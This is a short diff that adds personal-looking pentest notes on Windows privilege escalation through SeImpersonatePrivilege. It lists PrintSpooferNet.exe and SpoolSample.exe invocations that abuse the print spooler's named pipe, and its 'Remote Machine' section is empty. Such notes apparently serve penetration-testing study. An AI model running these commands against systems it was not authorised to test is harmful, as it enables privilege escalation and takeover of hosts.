@@ -1,1 +1,7 @@
+[SeImpersonatePrivilege]
 
+-Priv esc local machine:
+PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss (pipe server)
+SpoolSample.exe appserver appserver/pipe/test (client)
+
+-Remote Machine
